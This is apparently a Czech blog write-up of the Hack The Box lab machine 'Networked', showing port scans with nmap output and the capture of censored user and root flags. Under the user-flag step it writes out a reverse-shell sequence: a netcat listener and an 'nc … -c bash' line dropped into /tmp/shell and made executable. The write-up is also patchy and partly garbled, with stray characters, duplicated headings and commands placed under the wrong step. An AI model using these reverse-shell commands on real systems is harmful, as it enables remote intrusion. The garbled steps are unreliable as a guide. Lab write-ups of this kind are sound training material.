---
layout: post
author: Tomáš Matějíček
title: "Networked"
date: 2020-12-20
tags: ssh sudo php exploit enumeration privesc
---
[Networked](https://www.hackthebox.eu/home/machines/profile/203) je stroj z Hack The Box. Klíčová část útoku je webová enumerace a praktické zneužití nalezené slabiny.

### Vyhledání otevřených portů
Nejdřív mapuji služby, které jsou dostupné zvenku.
`nmap -p 1-65535 -T4 -A -sC -v $IP`
```
PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
443/tcp closed https
ca
```

### Vyhledání otevřených portů (2)
Nejdřív mapuji služby, které jsou dostupné zvenku.
`nmap -sU -T4 -v $IP`
```
PORT      STATE         SERVICE
684/udp   open|filtered corba-iiop-ssl
776/udp   open|filtered wpages
838/udp   open|filtered unknown
1101/udp  open|filtered pt2-discover
2002/udp  open|filtered globe
2161/udp  open|filtered apc-2161
5353/udp  open|filtered zeroconf
9950/udp  open|filtered apc-9950
16548/udp open|filtered unknown
16697/udp open|filtered unknown
17629/udp open|filtered unknown
17754/udp open|filtered zep
19718/udp open|filtered unknown
20522/udp open|filtered unknown
21212/udp open|filtered unknown
21320/udp open|filtered unknown
21663/udp open|filtered unknown
25280/udp open|filtered unknown
25375/udp open|filtered unknown
27195/udp open|filtered unknown
28465/udp open|filtered unknown
31681/udp open|filtered unknown
32798/udp open|filtered unknown
38412/udp open|filtered unknown
40724/udp open|filtered unknown
40732/udp open|filtered unknown
42577/udp open|filtered unknown
44160/udp open|filtered unknown
47981/udp open|filtered unknown
49188/udp open|filtered unknown
49220/udp open|filtered unknown
61319/udp open|filtered unknown
```

### Přihlášení na cíl
Po získání přihlašovacích údajů přecházím na stabilní shell na cílovém stroji.
`22 OpenSSH 7.4 (protocol 2.0)`
```
- Ověřit enumeraci SSH uživatelů
```

### Získání user flagu
Tímto potvrzuji úspěšný uživatelský přístup.
`cat /home/guly/user.txt`
```
__CENSORED__
netcat -lvp 4002
echo nc 10.10.15.13 4002 -c bash > /tmp/shell
chmod +x /tmp/shell
```

### Získání root flagu
Tímto potvrzuji úplné ovládnutí stroje.
`cat root.txt`
```
__CENSORED__
```

### Přílohy
![Networked-shell.php.gif](/drafts/Networked/Networked-shell.php.gif)
